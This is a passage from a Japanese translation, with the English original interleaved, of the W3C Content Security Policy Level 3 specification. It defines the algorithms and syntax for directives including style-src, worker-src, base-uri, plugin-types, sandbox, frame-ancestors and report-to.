`~nonceは~source~listに合致するか？$A( %要請 の`暗号用~nonce~metadata$rq, %~list )
~EQ `合致es^i
］
⇒
~RET `許容ed^i
◎
If the result of executing §6.6.1.2 Does nonce match source list? on request’s cryptographic nonce metadata and this directive’s value is "Matches", return "Allowed".
</li>

			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="style-src-post-request">
<h5 title="style-src Post-request check">6.1.11.2. `style-src^dir 要請後~検査</h5>

<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%要請 の`種別$rq ~EQ `style^l
］：
◎
If request’s type is "style":
</p>

		<ol>
			<li>
~IF［
`~nonceは~source~listに合致するか？$A( %要請 の`暗号用~nonce~metadata$rq, %~list )
~EQ `合致es^i
］
⇒
~RET `許容ed^i
◎
If the result of executing §6.6.1.2 Does nonce match source list? on request’s cryptographic nonce metadata and this directive’s value is "Matches", return "Allowed".
</li>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="style-src-inline">
<h5 title="style-src Post-request check">6.1.10.3. `style-src^dir ~inline検査</h5>

<p>
次の~algoが、この指令の`~inline検査$Aを与える：
◎
This directive’s inline check algorithm is as follows:
</p>

<p>
所与の
( `要素$ %要素, 文字列 %型, 文字列 %~source )
に対し：
◎
Given an Element (element), a string (type), and a string (source):
</p>

<ol>
	<li>
%~list ~LET この指令の`値$
◎
↓</li>
	<li>
<p>
~IF［
%型 ~IN { `style^l, `style attribute^l }
］：
◎
If type is "style" or "style attribute":
</p>
		<ol>
			<li>
~IF［
`要素 は ( 型, ~source ) について~source~listに合致するか？$A( %要素, %~list, %型, %~source )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.2.2 Does element match source list for type and source? on element, this directive’s value, type, and source, is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
				<section id="style-src-init">
<h5 title="style-src Initialization">6.1.10.4. `style-src^dir 初期化</h5>

<p>
次の~algoが、この指令の`初期化$Aを与える：
◎
This directive’s initialization algorithm is as follows:
</p>

<ol>
	<li>
<p class="issue">
CSSOM の~algoを監禁するために，実行~文脈に関わる何かをする。
CSSOM がこのための~hookを与えることは見込めないので、
<!-- ＊ -->
let’s work with them to put something reasonable together.
◎
Do something interesting to the execution context in order to lock down interesting CSSOM algorithms. I don’t think CSSOM gives us any hooks here, so let’s work with them to put something reasonable together.
</p>
	</li>
</ol>

				</section>
			</section>
			<section id="directive-worker-src">
<h4>6.1.12. `worker-src^dir</h4>

<p>
`worker-src@dir
指令は、［
どの~URLを［
`Worker$I ／ `SharedWorker$I ／ `ServiceWorker$I
］として読込んでよいか
］を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The worker-src directive restricts the URLs which may be loaded as a Worker, SharedWorker, or ServiceWorker. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "worker-src"
`directive-value$p = `serialized-source-list$p
</pre>

<div class="example">

<p>
~pageが次の~CSPを伴うならば：
◎
Given a page with the following Content Security Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `worker-src$dir https://example.com/
</pre>

<p>
次の~codeによる~fetchは，~network~errorを返すことになる
— 供された~URLは，
`worker-src$dir の`~source~list$に合致しないので：
◎
Fetches for the following code will return a network errors, as the URL provided do not match worker-src's source list:
</p>


<pre class="html-code">
&lt;script&gt;
  var blockedWorker = new Worker("data:application/javascript,...");
  blockedWorker = new SharedWorker("https://not-example.com/");
  navigator.serviceWorker.register('https://not-example.com/sw.js');
&lt;/script&gt;</pre>

</div>

				<section id="worker-src-pre-request">
<h5 title="worker-src Pre-request check">6.1.12.1. `worker-src^dir 要請前~検査</h5>


<p>
次の~algoが、この指令の`要請前~検査$Aを与える：
◎
This directive’s pre-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `施策$ %施策 )
に対し：
◎
Given a request (request) and a policy (policy):
</p>


<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN
{ `serviceworker^l, `sharedworker^l, `worker^l }
］：
◎
If request’s destination is one of "serviceworker", "sharedworker", or "worker":
</p>

		<ol><!-- ＊ start="4"？ -->
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="worker-src-post-request">
<h5 title="worker-src Post-request check">6.1.12.2. `worker-src^dir 要請後~検査</h5>
<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN
{ `serviceworker^l, `sharedworker^l, `worker^l }
］：
◎
If request’s destination is one of "serviceworker", "sharedworker", or "worker":
</p>

		<ol>
			<li>
~IF［
`要請に対する応答は~source~listに合致するか？$A( %応答, %要請, %~list )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.4 Does response to request match source list? on response, request, and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
			</section>
		</section>
		<section id="directives-document">
<h3 title="Document Directives ">6.2. 文書~指令</h3>

<p>
この節の指令は、施策が適用される［
文書／~worker
］環境の~propを統治する。
◎
The following directives govern the properties of a document or worker environment to which a policy applies.
</p>

			<section id="directive-base-uri">
<h4 title="base-uri">6.2.1. `base-uri^dir</h4>

<p>
`base-uri@dir
指令は、`文書$の `base$e 要素に利用できる`~URL$を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The base-uri directive restricts the URLs which can be used in a Document's base element. The syntax for the directive’s name and value is described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "base-uri"
`directive-value$p = `serialized-source-list$p
</pre>

<p>
次の~algoは、この指令を
監視する／施行する
ために，［
~HTMLの，`凍結済み基底~URLを設定する$~algo
］の間に~callされる：
◎
The following algorithm is called during HTML’s set the frozen base url algorithm in order to monitor and enforce this directive:
</p>



				<section id="allow-base-for-document">
<h5 title="Is base allowed for document? " data-algorithm="Is base allowed for document?">6.2.1.1. %文書 に対する %基底 は許容されるか？</h5>

<p>
次の~algoは、
( `~URL$ %基底, `文書$ %文書 )
が与えられた下で，［
%基底 を `base$e 要素の `href$a 属性の値として利用できるならば `許容ed^i ／
~ELSE_ `阻止ed^i
］を返す：
◎
Given a URL (base), and a Document (document), this algorithm returns "Allowed" if base may be used as the value of a base element’s href attribute, and "Blocked" otherwise:
</p>

<ol>
	<li>
<p>
~FOR
%文書 の`大域~obj$の`~CSP~list$内の ~EACH( %施策 ) に対し：
◎
For each policy in document’s global object’s csp list:
</p>

<ol>
	<li>
%~source~list ~LET ~NULL
◎
Let source list be null.
</li>
	<li>
~IF［
%施策 の`指令~集合$内に［
`名前$ ~EQ `base-uri^l
］なる`指令$はある
］
⇒
%~source~list ~SET その`指令$の`値$
◎
If a directive whose name is "base-uri" is present in policy’s directive set, set source list to that directive’s value.
</li>
	<li>
~IF［
%~source~list ~EQ ~NULL
］
⇒
~CONTINUE
◎
If source list is null, skip to the next policy.
</li>
	<li>
<p>
~IF［
`~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？$A( %基底, %~source~list, %文書 に`関連する設定群~obj$の生成元 )
~EQ `非合致^i
］：
◎
If the result of executing §6.6.1.5 Does url match source list in origin with redirect count? on base, source list, document’s relevant settings object’s origin, and 0 is "Does Not Match":
</p>
		<ol>
	<li>
%違反 ~LET `新たな違反~obj$A1(
%文書 の`大域~obj$, %施策, `base-uri$dir
)
◎
Let violation be the result of executing §2.3.1 Create a violation object for global, policy, and directive on document’s global object, policy, and "base-uri".
</li>
	<li>
%違反 の`資源$vr ~SET `inline^l
◎
Set violation’s resource to "inline".
</li>
	<li>
%違反 を用いて，`違反を報告する$A
◎
Execute §5.3 Report a violation on violation.
</li>
	<li>
~IF［
%施策 の`処分先$ ~EQ `enforce^l
］
⇒
~RET `阻止ed^i
◎
If policy’s disposition is "enforce", return "Blocked".
</li>
				</ol>
			</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li></ol>


				</section>
			</section>
			<section id="directive-plugin-types">
<h4 title="plugin-types">6.2.2. `plugin-types^dir</h4>

<p>
`plugin-types@dir
指令は、読込める資源の型を制限することにより，文書の中に埋込める~pluginの集合を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The plugin-types directive restricts the set of plugins that can be embedded into a document by limiting the types of resources which can be loaded. The directive’s syntax is described by the following ABNF grammar:
</p>


<pre class="ABNF">
`directive-name$p  = "plugin-types"
`directive-value$p = `media-type-list$p

`media-type-list@p = `media-type$p *( `RWS$P `media-type$p )
`media-type@p = `type$p "/" `subtype$p
; type and subtype are defined in RFC 2045
</pre>

<p>
`plugin-types^dir 指令が在する場合、
`embed$e ／ `object$e
要素の~instance化は、次のいずれかの条件が満たされるならば失敗することになる：
◎
If a plugin-types directive is present, instantiation of an embed or object element will fail if any of the following conditions hold:
</p>

<ol>
	<li>
要素は、 `type$a 属性を介して，明示的に`妥当な~MIME型$を宣言していない。
◎
The element does not explicitly declare a valid MIME type via a type attribute.
</li>

	<li>
宣言された型は指令の値~内の どの~itemにも合致しない。
◎
The declared type does not match one of the items in the directive’s value.
</li>

	<li>
~fetchされた資源は、宣言された型に合致しない。
◎
The fetched resource does not match the declared type.
</li>
</ol>

<div class="example">

<p>
次の~CSPを伴う~pageが与えられた場合:
◎
Given a page with the following Content Security Policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `plugin-types$dir application/pdf
</pre>


<p>
次のいずれの~codeによる~fetchも，~network~errorになる：
◎
Fetches for the following code will all return network errors:
</p>


<pre class="html-code">
&lt;!-- <span class="comment">
`type^a 宣言がない
◎
No 'type' declaration
</span> --&gt;
&lt;object
    data="https://example.com/flash"
&gt;&lt;/object&gt;

&lt;!-- <span class="comment">
`type^a 宣言が合致しない
◎
Non-matching 'type' declaration
</span> --&gt;
&lt;object
    data="https://example.com/flash"
    type="application/x-shockwave-flash"
&gt;&lt;/object&gt;

&lt;!-- <span class="comment">
資源が合致しない
◎
Non-matching resource
</span> --&gt;
&lt;object
    data="https://example.com/flash"
    type="application/pdf"
&gt;&lt;/object&gt;
</pre>


<p>
~pageが次の~headerを送信して
Flash 内容を許容した場合：
◎
If the page allowed Flash content by sending the following header:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    `plugin-types$dir application/x-shockwave-flash
</pre>


<p>
上の二番目の~itemは、成功裡に読込まれる：
◎
Then the second item above would load successfully:
</p>


<pre class="html-code">
&lt;!-- <span class="comment">
`type^a 宣言, 資源の両者とも合致する
◎
Matching 'type' declaration and resource
</span> --&gt;
&lt;object
    data="https://example.com/flash"
    type="application/x-shockwave-flash"
&gt;&lt;/object&gt;
</pre>

</div>



				<section id="plugin-types-post-request-check">
<h5 title="plugin-types Post-Request Check">6.2.2.1. `plugin-types^dir 要請後~検査</h5>


<p>
次の~algoが、この指令の`要請後~検査$Aを与える：
◎
This directive’s post-request check algorithm is as follows:
</p>


<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%施策 は利用されない。
◎
Assert: policy is unused.
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN { `object^l, `embed^l }
］：
◎
If request’s destination is either "object" or "embed":
</p>

		<ol>
			<li>
%型 ~LET
%応答 の`~header~list$rsから`~MIME型を抽出-$Aした結果
◎
Let type be the result of extracting a MIME type from response’s header list.
</li>
			<li>
~IF［
%型 ~NIN~ACI この指令の`値$
］
⇒
~RET `阻止ed^i
◎
If type is not an ASCII case-insensitive match for any item in this directive’s value, return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
				<section id="should-plugin-element-be-blocked-a-priori-by-content-security-policy">
<h5 title="Should plugin element be blocked a priori by Content Security Policy?:">6.2.2.2. %~plugin要素 は~CSPにより先天的に阻止されるべきか？</h5>


<p>
この~algoは、所与の`要素$ %~plugin要素 に対し，［
%~plugin要素 の `type^a 属性と
%~plugin要素 が属する文書に適用されている施策
］に基づいて，［
`阻止ed^i または `許容ed^i
］を返す
◎
Given an Element (plugin element), this algorithm returns "Blocked" or "Allowed" based on the element’s type attribute and the policy applied to its document:
</p>

<ol>

	<li>
<p>
~FOR
%~plugin要素 の`~node文書$の`~CSP~list$doc内の
~EACH ( %施策 ) に対し：
◎
For each policy in plugin element’s node document’s CSP list:
</p>

		<ol>
			<li>
<p>
~IF［
%施策 内に［
`名前$ ~EQ `plugin-types$dir
］なる`指令$ %指令 はある
］：
◎
If policy contains a directive (directive) whose name is plugin-types:
</p>

				<ol>
					<li>
%型 ~LET ［
%~plugin要素 は `applet$e 要素である ならば `application/x-java-applet^l ／
~ELSE_ %~plugin要素 は `type^a 属性を有するならば その値 ／
~ELSE_ `null^l
］
◎
Let type be "application/x-java-applet" if plugin element is an applet element, or plugin element’s type attribute’s value if present, or "null" otherwise.
</li>
					<li>
<p>
~IF［
次のいずれかが満たされる
］
⇒
~RET `阻止ed^i：
◎
Return "Blocked" if any of the following are true:
</p>

						<ol>
							<li>
%型 ~EQ `null^l
◎
type is null.
</li>
							<li>
%型 は`妥当な~MIME型$でない
◎
type is not a valid MIME type.
</li>
							<li>
%型 ~NIN~ACI %指令 の`値$
◎
type is not an ASCII case-insensitive match for any item in directive’s value.
</li>
						</ol>
					</li>
				</ol>
			</li>
		</ol>
	</li>

	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>
				</section>
			</section>
			<section id="directive-sandbox">
<h4 title="sandbox">6.2.3. `sandbox^dir</h4>

<p>
`sandbox@dir
指令は、［
それが `sandbox$a ~propを有する `iframe$e 内に含されていた
］かのように，~UAが資源に適用することになる~HTML~sandbox施策を指定する。
◎
The sandbox directive specifies an HTML sandbox policy which the user agent will apply to a resource, just as though it had been included in an iframe with a sandbox property.
</p>

<p>
この指令の名前と値の構文は、次の`~ABNF$で述べられる。
加えて，その各 `token^p 値は、
`HTML$r により［
`iframe$e の `sandbox$a 属性に許容される値
］として定義される，いずれかの~keywordで~MUST：
◎
The directive’s syntax is described by the following ABNF grammar, with the additional requirement that each token value MUST be one of the keywords defined by HTML specification as allowed values for the iframe sandbox attribute [HTML].
</p>

<pre class="ABNF">
`directive-name$p  = "sandbox"
`directive-value$p = "" / `token$p *( `RWS$P `token$p )
</pre>

<p>
この指令には、報告処理の要件はない
— この指令が［
`Content-Security-Policy-Report-Only$h ~header内で送達された ／
`meta$e 要素の中にある
］ときは、まるごと無視されることになる。
◎
This directive has no reporting requirements; it will be ignored entirely when delivered in a Content-Security-Policy-Report-Only header, or within a meta element.
</p>



				<section id="sandbox-response">
<h5 title="sandbox Response Check">6.2.3.1. `sandbox^dir 応答~検査</h5>

<p>
次の~algoが、この指令の`応答~検査$Aを与える：
◎
This directive’s response check algorithm is as follows:
</p>

<p>
所与の
( `要請$ %要請, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a request (request), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%応答 は利用されない。
◎
Assert: response is unused.
</li>
	<li>
~IF［
%施策 の`処分先$ ~NEQ `enforce^l
］
⇒
~RET `許容ed^i
◎
If policy’s disposition is not "enforce", then return "Allowed".
</li>
	<li>
<p>
~IF［
%要請 の`行先$rq ~IN
{ `serviceworker^l, `sharedworker^l, `worker^l }
］：
◎
If request’s destination is one of "serviceworker", "sharedworker", or "worker":
</p>

<ol>
	<li>
%出力 ~LET この指令の`値$を入力に，`~sandbox用~指令を構文解析-$した結果
◎
↓</li>
	<li>
<p>
~IF［
`閲覧文脈~sandbox化( ~script )~flag$ ~IN %出力
］~OR［
`閲覧文脈~sandbox化( 生成元 )~flag$ ~IN %出力
］
⇒
~RET `阻止ed^i
◎
If the result of the Parse a sandboxing directive algorithm using this directive’s value as the input contains either the sandboxed scripts browsing context flag or the sandboxed origin browsing context flag flags, return "Blocked".
</p>

<p class="note">注記：
この段は、~workerを一意的~生成元<!-- ＊ -->の中に~sandbox化できるようにした場合には，変更する必要がある。
そうするのは、相当に理に適うものに見える。
◎
Note: This will need to change if we allow Workers to be sandboxed into unique origins, which seems like a pretty reasonable thing to do.
</p>
			</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
				<section id="sandbox-init">
<h5 title="sandbox Initialization">6.2.3.2. `sandbox^dir 初期化</h5>

<p>
次の~algoが、この指令の`初期化$Aを与える。
それは、その施策~内に `sandbox$dir 値が在するかどうかに則って，
`文書$の`強制~sandbox用~flag集合$を次に従って調整する責を負う：
◎
This directive’s initialization algorithm is responsible for adjusting a Document's forced sandboxing flag set according to the sandbox values present in its policies, as follows:
</p>

<p>
所与の
( `文書$または`大域~obj$ %文脈, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a Document or global object (context), a response (response), and a policy (policy):
</p>

<ol>
	<li>
~Assert：
%応答 は利用されない。
◎
Assert: response is unused.
</li>
	<li>
<p>
~IF［
%施策 の`処分先$ ~NEQ `enforce^l
］~OR［
%文脈 は`文書$でない
］
⇒
~RET
◎
If policy’s disposition is not "enforce", or context is not a Document, then abort this algorithm.
</p>

<p class="note">注記：
この段は、~workerを~sandbox化できるようにした場合には，変更する必要がある。
そうするのは、相当に理に適うものに見える。
◎
Note: This will need to change if we allow Workers to be sandboxed, which seems like a pretty reasonable thing to do.
</p>
	</li>
	<li>
この指令の`値$を入力に,
%文脈 の`強制~sandbox用~flag集合$を出力とする下で，
`~sandbox用~指令を構文解析-$する
◎
Parse a sandboxing directive using this directive’s value as the input, and context’s forced sandboxing flag set as the output.
</li>

</ol>

				</section>
			</section>

			<section id="directive-disown-opener">
<h4 title="disown-opener">6.2.4. `disown-opener^dir</h4>

<p>
`disown-opener@dir
指令は、［
~navigateされた資源の`~onenerを~NULL化$する
］ことを確保する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The disown-opener directive ensures that a resource will disown its opener when navigated to. The directive’s syntax is described by the following ABNF grammar:
</p>

<pre class="ABNF">
`directive-name$p  = "disown-opener"
`directive-value$p = ""
</pre>

<p>
この指令には、報告処理の要件はない
— この指令が［
`Content-Security-Policy-Report-Only$h ~header内で送達された ／
`meta$e 要素の中にある
］ときは、まるごと無視されることになる。
◎
This directive has no reporting requirements; it will be ignored entirely when delivered in a Content-Security-Policy-Report-Only header, or within a meta element.
</p>

<p class="issue">
この~modelが正当かどうかは確かでない。
<a href="https://github.com/w3c/webappsec/issues/139">その逆</a>
も~careされることを確保する必要がある
— 文書を開いた側（ opener ）, 開かれた側（ openee ）の両者とも包括するような、もっと上手い構文があるかもしれない。
`disown-openee^dir は変だ。
`disown 'opener' 'openee'^P
はどうか？
生成元の制約は、片方または両方に課す必要はあるのか？
◎
Not sure this is the right model. We need to ensure that we take care of the inverse as well, and there might be a cleverer syntax that could encompass both a document’s opener, and a document’s openees. disown-openee is weird. Maybe disown 'opener' 'openee'? Do we need origin restrictions on either/both?
</p>

				<section id="disown-opener-init">
<h5 title="disown-opener Initialization">6.2.4.1. `disown-opener^dir 初期化</h5>

<p>
次の~algoが、この指令の`初期化$Aを与える：
◎
This directive’s initialization algorithm is as follows:
</p>

<p>
所与の
( `文書$または`大域~obj$ %文脈, `応答$ %応答, `施策$ %施策 )
に対し：
◎
Given a Document or global object (context), a response (response), and a policy (policy):
</p>


<ol>
	<li>
~Assert：
%応答, %施策 は利用されない。
◎
Assert: response and policy are unused.
</li>
	<li>
~IF［
%文脈 の`担当の閲覧文脈$を`開いた閲覧文脈$はある
］
⇒
%文脈 の`~onenerを~NULL化$する
◎
If context’s responsible browsing context has an opener browsing context, disown its opener.
</li>
</ol>

<p class="issue">
これは `iframe$e 内では何をする？
何かある？
◎
What should this do in an iframe? Anything?
</p>



				</section>
			</section>
		</section>
		<section id="directives-navigation">
<h3 title="Navigation Directives ">6.3. ~navi指令</h3>


			<section id="directive-form-action">
<h4 title="form-action">6.3.1. `form-action^dir</h4>

<p>
`form-action@dir
指令は、所与の文脈からの~form提出の~targetとして利用できる`~URL$を制約する。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The form-action directive restricts the URLs which can be used as the target of a form submissions from a given context. The directive’s syntax is described by the following ABNF grammar:
</p>


<pre class="ABNF">
`directive-name$p  = "form-action"
`directive-value$p = `serialized-source-list$p
</pre>


				<section id="form-action-pre-navigate">
<h5 title="form-action Pre-Navigation Check">6.3.1.1. `form-action^dir による~navi前~検査</h5>


<p>
次の~algoが、この指令の`~navi前~検査$Aを与える：
それは、所与の
( 
`要請$ %要請,
文字列 %種別,
`閲覧文脈$ %~source,
`閲覧文脈$ %~target
)
に対し，［
%~target のいずれかの先祖が
応答に伴って送達されてきた `frame-ancestors^dir 指令に違反するならば `阻止ed^i ／
~ELSE_ `許容ed^i
］を返す：
◎
Given a request (request), a string (type, "form-submission or "other") and two browsing contexts (source and target), this algorithm returns "Blocked" if one or more of the ancestors of target violate the frame-ancestors directive delivered with the response, and "Allowed" otherwise. This constitutes the form-action' directive’s pre-navigation check:
</p>

<ol>
	<li>
~Assert：
%種別 ~IN { `form-submission^l, `other^l }
◎
↑</li>
	<li>
~Assert：
%~source, %~target は、この~algoには利用されない
— `form-action^dir が懸念するのは、外向けの要請の詳細に限られるので。
◎
Assert: source and target are unused in this algorithm, as form-action is concerned only with details of the outgoing request.
</li>

	<li>
<p>
~IF［
%種別 ~EQ `form-submission^l
］：
◎
If type is "form-submission":
</p>

		<ol>
			<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
		</ol>
	</li>

	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>
				</section>
			</section>
			<section id="directive-frame-ancestors">
<h4 title="frame-ancestors">6.3.2. `frame-ancestors^dir</h4>

<p>
`frame-ancestors@dir
指令は、［
`frame$e／`iframe$e／`object$e／`embed$e／`applet$e
］要素を利用して埋込める資源の`~URL$を制約する。
この指令を利用すれば、敵対的になり得る文脈の中に資源が埋込まれる~riskを避けることで、多くの UI Redressing 【 UI の着せ替え】 攻撃 `UISECURITY$r 避けることができる。
◎
The frame-ancestors directive restricts the URLs which can embed the resource using frame, iframe, object, embed, or applet element. Resources can use this directive to avoid many UI Redressing [UISECURITY] attacks, by avoiding the risk of being embedded into potentially hostile contexts.
</p>

<p>
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The directive’s syntax is described by the following ABNF grammar:
</p>

<pre class="ABNF">
`directive-name$p  = "frame-ancestors"
`directive-value$p = `ancestor-source-list$p

`ancestor-source-list@p
              = ( `ancestor-source$p *( `RWS$P `ancestor-source$p) )
              / "`none$pl"
`ancestor-source@p
              = `scheme-source$p
              / `host-source$p
              / "`self$pl"
</pre>

<p>
`meta$e 要素を介して宣言された施策~内に包含されている `frame-ancestors^dir 指令は、無視され~MUST。
◎
The frame-ancestors directive MUST be ignored when contained in a policy declared via a meta element.
</p>

<p class="note">注記：
`frame-ancestors^dir 指令は、構文は`~source~list$に類似するが，
`default-src^dir 指令が指定されていても その値に~fall-backしない。
すなわち、施策が
<samp>`default-src^dir `none$pl</samp>
を宣言していても、依然として，資源はどこからでも埋込まれることが許容される。
◎
Note: The frame-ancestors directive’s syntax is similar to a source list, but frame-ancestors will not fall back to the default-src directive’s value if one is specified. That is, a policy that declares default-src 'none' will still allow the resource to be embedded by anyone.
</p>



				<section id="frame-ancestors-navigation-response">
<h5 title="frame-ancestors Navigation Response Check">6.3.2.1. `frame-ancestors^dir の~navi応答~検査</h5>

<p>
次の~algoが、この指令の`~navi応答~検査$Aを与える：
それは、所与の (
`要請$ %要請,
`応答$ %~navi応答
`閲覧文脈$ %~source,
`閲覧文脈$ %~target
) に対し，［
%~target のいずれかの先祖が応答に伴って送達されてきた `frame-ancestors^dir 指令に違反するならば `阻止ed^i ／
~ELSE_ `許容ed^i
］返す：
◎
Given a request (request), a response (navigation response) and two browsing contexts (source and target), this algorithm returns "Blocked" if one or more of the ancestors of target violate the frame-ancestors directive delivered with the response, and "Allowed" otherwise. This constitutes the frame-ancestors' directive’s navigation response check:
</p>

<ol>
	<li>
~Assert:
%要請, %~navi応答, %~source
は，この~algoには利用されない
— `frame-ancestors^dir が懸念するのは %~target の先祖のみなので
◎
Assert: request, navigation response, and source are unused in this algorithm, as frame-ancestors is concerned only with target’s ancestors.
</li>
	<li>
<p>
~WHILE %~target には`親~閲覧文脈$ %親 がある
◎
If target is not a nested browsing context, return "Allowed".
◎
Let current be target.
◎
While current has a parent browsing context (parent):
</p>

		<ol>
			<li>
%~target ~SET %親
◎
Set current to parent.
</li>
			<li>
%生成元 ~LET ［［［
%親 にて`作動中の文書$
］の`生成元$
］を`~Unicode直列化-$した結果
］を`~URL構文解析器$uにかけた結果
◎
Let origin be the result of executing the URL parser on the unicode serialization of parent’s active document’s origin.
</li>
			<li>
~IF［
`~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？$A( %生成元, この指令の`値$, %~navi応答 の`~url$rsの`生成元$u, 0 )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If §6.6.1.5 Does url match source list in origin with redirect count? returns Does Not Match when executed upon origin, this directive’s value, navigation response’s url’s origin, and 0, return "Blocked".
</li>
		</ol>
	</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>


				</section>
			</section>
		</section>
		<section id="directives-reporting">
<h3 title="Reporting Directives">6.4. 指令の報告処理</h3>

<p>
この文書~内の各種~algoは、報告処理~処理の中に~hookされる
—
［
`新たな違反~obj$A( %大域~obj, … ) ／
`新たな違反~obj$A1( %要請, … )
］手続きを介して`違反$~objを構築した上で、報告を送達するときに，その~objを
`違反を報告する$A手続きに渡すことにより。
◎
Various algorithms in this document hook into the reporting process by constructing a violation object via §2.3.2 Create a violation object for request, policy, and directive or §2.3.1 Create a violation object for global, policy, and directive, and passing that object to §5.3 Report a violation to deliver the report.
</p>

			<section id="directive-report-uri">
<h4 title="report-uri">6.4.1. `report-uri^dir</h4>

<div class="note">
<p>注記：
`report-uri$dir 指令は、非推奨にされた。
代わりに `report-to$dir を利用されたし。
後者が在する場合、この指令は無視されることになる。
後方互換性を確保するためには、次のように両者とも指定することを勧める：
◎
Note: The report-uri directive is deprecated. Please use the report-to directive instead. If the latter directive is present, this directive will be ignored. To ensure backwards compatibility, we suggest specifying both, like this:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    ...;
    `report-uri$dir https://endpoint.com;
    `report-to$dir groupname
</pre>
</div>





<p>
`report-uri@dir
指令は、`報告先$
— 特定0の挙動が防止されたとき，`違反~報告$の送信-先になる~netowrk端点 —
の集合を定義する。
◎
The report-uri directive defines a set of endpoints to which violation reports will be sent when particular behaviors are prevented.
</p>

<pre class="ABNF">
`directive-name$p  = "report-uri"
`directive-value$p = `uri-reference$p *( `RWS$P `uri-reference$p )
; The uri-reference grammar is defined in Section 4.1 of RFC 3986.
</pre>

<p>
この指令は、それ自身は効果を持たず，他の指令との組合せにおいてのみ効果を~~発揮する。
◎
The directive has no effect in and of itself, but only gains meaning in combination with other directives.
</p>

			</section>
			<section id="directive-report-to">
<h4 title="report-to">6.4.2. `report-to^dir</h4>

<p>
`report-to@dir
指令は、違反~報告の送信-先とされるべき`報告先~group$ `OOB-REPORTING$r
を定義する。
この指令の挙動は、`違反を報告する$A~algoにて定義される。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The report-to directive defines a reporting group to which violation reports ought to be sent [OOB-REPORTING]. The directive’s behavior is defined in §5.3 Report a violation. The directive’s name and value are described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "report-to"
`directive-value$p = `token$p
</pre>

			</section>
		</section>
		<section id="directives-elsewhere">
<h3 title="Directives Defined in Other Documents">6.5. 他の文書にて定義される指令</h3>

<p>
